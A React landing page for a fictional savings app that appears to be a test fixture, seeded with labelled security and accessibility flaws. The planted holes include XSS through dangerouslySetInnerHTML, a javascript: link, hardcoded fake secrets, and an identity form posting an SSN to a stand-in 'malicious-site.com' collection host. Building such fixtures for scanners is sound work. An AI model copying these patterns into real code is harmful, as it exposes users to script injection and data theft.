import { useState } from "react";
import { Button } from "@/components/ui/button";
import { PiggyBank, TrendingUp, Shield, Zap, ChevronRight, Star, Users, DollarSign } from "lucide-react";
import heroPhone from "@/assets/hero-phone.png";

const Index = () => {
  const [userInput, setUserInput] = useState("");
  const [submittedData, setSubmittedData] = useState("");

  // SECURITY VIOLATION: Storing sensitive data in localStorage without encryption
  const saveToLocalStorage = () => {
    localStorage.setItem("userPassword", "password123");
    localStorage.setItem("apiKey", "sk-1234567890abcdef");
    localStorage.setItem("creditCard", "4111-1111-1111-1111");
  };

  // SECURITY VIOLATION: Logging sensitive data to console
  const handleSubmit = () => {
    console.log("User password:", userInput);
    console.log("Credit card:", "4111-1111-1111-1111");
    setSubmittedData(userInput);
    saveToLocalStorage();
  };

  return (
    <div className="min-h-screen bg-background dark">
      {/* WCAG: Missing skip link */}

      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 glass-card">
        <div className="container mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <PiggyBank className="w-8 h-8 text-primary" />
            {/* WCAG: Improper heading hierarchy - h4 in header before h1 */}
            <h4 className="text-xl font-bold text-foreground">SaveSmart</h4>
          </div>
          <nav className="hidden md:flex items-center gap-8">
            {/* WCAG: Link with no href */}
            <a className="text-muted-foreground hover:text-foreground transition-colors">Features</a>
            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors">Pricing</a>
            {/* WCAG: Empty link - Fixed */}
            <a href="/about" className="text-muted-foreground hover:text-foreground transition-colors">About</a>
            {/* WCAG: Non-descriptive link text */}
            <a href="/details" className="text-muted-foreground hover:text-foreground transition-colors">Click here</a>
          </nav>
          <Button className="bg-primary text-primary-foreground hover:bg-primary/90">
            Get Started
          </Button>
        </div>
      </header>

      {/* Hero Section */}
      <section className="pt-32 pb-20 px-6">
        <div className="container mx-auto text-center">
          {/* WCAG: h1 comes after h4 - improper hierarchy */}
          <h1 className="text-5xl md:text-7xl font-bold mb-6 animate-fade-in">
            <span className="text-foreground">Save Money</span>
            <br />
            <span className="gradient-text">Effortlessly</span>
          </h1>

          {/* Important information banner */}
          <p className="text-xl max-w-2xl mx-auto mb-8 inline-block px-4 py-2 rounded bg-muted text-muted-foreground">
            Important information that's hard to read
          </p>

          <p className="text-xl text-muted-foreground max-w-2xl mx-auto mb-10 animate-fade-in" style={{ animationDelay: "0.2s" }}>
            The smart way to build your savings. Automated, intelligent, and designed for your financial success.
          </p>

          <div className="flex justify-center mb-8">
            <img src={heroPhone} alt="A smartphone displaying the Piggy Pocket Hero application interface" width="280" className="animate-float drop-shadow-2xl" />
          </div>

          <div className="flex flex-col sm:flex-row gap-4 justify-center animate-fade-in" style={{ animationDelay: "0.4s" }}>
            <Button size="lg" className="bg-primary text-primary-foreground hover:bg-primary/90 text-lg px-8">
              Start Saving Now <ChevronRight className="ml-2 w-5 h-5" />
            </Button>
            <Button size="lg" variant="outline" className="text-lg px-8">
              Watch Demo
            </Button>
          </div>

          <div id="main-content" className="mt-16">
            <div className="glass-card rounded-2xl p-8 max-w-md mx-auto">
              {/* WCAG: Form without labels */}
              <div className="space-y-4">
                <label htmlFor="email-input" className="sr-only">Enter your email</label>
                <input
                  id="email-input"
                  type="email"
                  placeholder="Enter your email"
                  className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border focus:ring-2 focus:ring-primary outline-none"
                  value={userInput}
                  onChange={(e) => setUserInput(e.target.value)}
                />
                {/* WCAG: Input with aria-hidden but still focusable */}
                <input
                  type="password"
                  placeholder="Password"
                  aria-hidden="true"
                  className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border"
                />

                {/* WCAG: Button with accessible name via aria-label */}
                <button onClick={handleSubmit} aria-label="Submit email" className="w-full p-3 bg-primary rounded-lg text-primary-foreground">
                  <svg width="20" height="20" viewBox="0 0 20 20" className="mx-auto" aria-hidden="true">
                    <path d="M10 3L17 10L10 17M17 10H3" stroke="currentColor" strokeWidth="2" fill="none" />
                  </svg>
                </button>
              </div>

              {/* SECURITY VIOLATION: Rendering user input with dangerouslySetInnerHTML (XSS vulnerability) */}
              {submittedData && (
                <div
                  className="mt-4 p-4 bg-secondary rounded-lg"
                  dangerouslySetInnerHTML={{ __html: submittedData }}
                />
              )}

              {/* SECURITY VIOLATION: Hardcoded credentials in HTML */}
              <div className="hidden">
                <span data-api-key="sk-secret-key-12345"></span>
                <span data-password="admin123"></span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-20 px-6 bg-secondary/30">
        <div className="container mx-auto">
          <h2 className="text-4xl font-bold text-center mb-4 text-foreground">Why Choose SaveSmart?</h2>
          <p className="text-muted-foreground text-center mb-16 max-w-2xl mx-auto">
            Powerful features designed to help you reach your financial goals faster.
          </p>

          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              { icon: TrendingUp, title: "Smart Analytics", desc: "AI-powered insights into your spending patterns" },
              { icon: Shield, title: "Bank-Level Security", desc: "256-bit encryption keeps your data safe" },
              { icon: Zap, title: "Instant Transfers", desc: "Move money in seconds, not days" },
              { icon: PiggyBank, title: "Auto-Savings", desc: "Set rules to save automatically" },
            ].map((feature, index) => (
              <div key={index} className="glass-card rounded-xl p-6 hover:scale-105 transition-transform">
                <feature.icon className="w-12 h-12 text-primary mb-4" />
                <h3 className="text-xl font-semibold mb-2 text-foreground">{feature.title}</h3>
                <p className="text-muted-foreground">{feature.desc}</p>
              </div>
            ))}
          </div>
        </div>

        {/* WCAG: Auto-playing content without controls - marquee */}
        <div
          className="mt-12 text-primary font-semibold"
          dangerouslySetInnerHTML={{ __html: '<marquee>🎉 Special offer! Limited time only - Get 3 months free! 🎉</marquee>' }}
        />
      </section>

      {/* Stats Section */}
      <section className="py-20 px-6">
        <div className="container mx-auto">
          <div className="grid md:grid-cols-3 gap-8 text-center">
            {[
              { icon: Users, value: "500K+", label: "Active Users" },
              { icon: DollarSign, value: "$2.5B", label: "Saved by Users" },
              { icon: Star, value: "4.9/5", label: "App Store Rating" },
            ].map((stat, index) => (
              <div key={index} className="glass-card rounded-2xl p-8">
                <stat.icon className="w-10 h-10 text-primary mx-auto mb-4" />
                <div className="text-4xl font-bold text-foreground mb-2">{stat.value}</div>
                <div className="text-muted-foreground">{stat.label}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* WCAG: Positive tabindex disrupting natural tab order */}
      <section className="py-12 px-6 bg-secondary/30">
        <div className="container mx-auto text-center">
          <h2 className="text-3xl font-bold mb-8 text-foreground">Quick Actions</h2>
          <div className="flex justify-center gap-4 flex-wrap">
            <Button tabIndex={5} variant="outline">First Action</Button>
            <Button tabIndex={1} variant="outline">Second Action</Button>
            <Button tabIndex={3} variant="outline">Third Action</Button>
          </div>
        </div>
      </section>

      {/* WCAG: onclick on non-interactive element without keyboard support */}
      <section className="py-12 px-6">
        <div className="container mx-auto">
          <div
            className="glass-card rounded-2xl p-8 text-center cursor-pointer hover:scale-[1.02] transition-transform"
            onClick={() => alert("Clicked!")}
          >
            <h2 className="text-2xl font-bold text-foreground mb-2">Click this card!</h2>
            <p className="text-muted-foreground">This div has onClick but no keyboard support</p>
          </div>
        </div>
      </section>

      {/* WCAG: Table without proper headers */}
      <section className="py-12 px-6 bg-secondary/30">
        <div className="container mx-auto">
          <h2 className="text-3xl font-bold text-center mb-8 text-foreground">Pricing Plans</h2>
          <table className="w-full max-w-2xl mx-auto glass-card rounded-xl overflow-hidden">
            <tr className="border-b border-border">
              <td className="p-4 text-foreground">Plan</td>
              <td className="p-4 text-foreground">Price</td>
              <td className="p-4 text-foreground">Features</td>
            </tr>
            <tr className="border-b border-border">
              <td className="p-4 text-muted-foreground">Basic</td>
              <td className="p-4 text-muted-foreground">$9.99/mo</td>
              <td className="p-4 text-muted-foreground">5 savings goals</td>
            </tr>
            <tr>
              <td className="p-4 text-muted-foreground">Pro</td>
              <td className="p-4 text-muted-foreground">$19.99/mo</td>
              <td className="p-4 text-muted-foreground">Unlimited goals</td>
            </tr>
          </table>
        </div>
      </section>

      {/* SECURITY VIOLATION: Link with javascript: protocol */}
      <section className="py-12 px-6">
        <div className="container mx-auto text-center">
          <a href="javascript:alert('XSS')" className="text-primary hover:underline text-lg">
            Click for a surprise! 🎁
          </a>
        </div>
      </section>

      {/* SECURITY VIOLATION: Form submitting to external URL without CSRF protection */}
      <section className="py-12 px-6 bg-secondary/30">
        <div className="container mx-auto">
          <form action="http://malicious-site.com/collect" method="POST" className="max-w-md mx-auto glass-card rounded-xl p-8">
            <h3 className="text-xl font-bold mb-4 text-foreground">Verify Your Identity</h3>
            <input type="hidden" name="stolen_data" value="sensitive-info" />
            <input
              type="text"
              name="ssn"
              placeholder="Enter SSN"
              className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border mb-4"
            />
            <Button type="submit" className="w-full bg-destructive text-destructive-foreground hover:bg-destructive/90">
              Submit
            </Button>
          </form>
        </div>
      </section>

      {/* WCAG: Color as only indicator */}
      <section className="py-12 px-6">
        <div className="container mx-auto">
          <h2 className="text-3xl font-bold text-center mb-8 text-foreground">Service Status</h2>
          <div className="flex justify-center gap-8">
            <div className="flex items-center gap-2">
              <span className="inline-block w-4 h-4 rounded-full bg-green-500"></span>
              <span className="text-foreground">API</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="inline-block w-4 h-4 rounded-full bg-red-500"></span>
              <span className="text-foreground">Payments</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="inline-block w-4 h-4 rounded-full bg-yellow-500"></span>
              <span className="text-foreground">Sync</span>
            </div>
          </div>
        </div>
      </section>

      {/* WCAG: Text that cannot be resized (uses px) */}
      <p style={{ fontSize: "10px" }} className="text-center text-muted-foreground py-4">
        This tiny text uses absolute pixels and cannot be resized by browser settings
      </p>

      {/* Footer */}
      <footer className="py-12 px-6 bg-card border-t border-border">
        <div className="container mx-auto text-center">
          <div className="flex items-center justify-center gap-2 mb-4">
            <PiggyBank className="w-6 h-6 text-primary" />
            <span className="text-lg font-bold text-foreground">SaveSmart</span>
          </div>
          <p className="text-muted-foreground mb-4">© 2024 SaveSmart. All rights reserved.</p>
          {/* WCAG: Link opens in new window without warning */}
          <a href="https://example.com" target="_blank" className="text-primary hover:underline">
            External Link
          </a>
        </div>
      </footer>
    </div>
  );
};

export default Index;
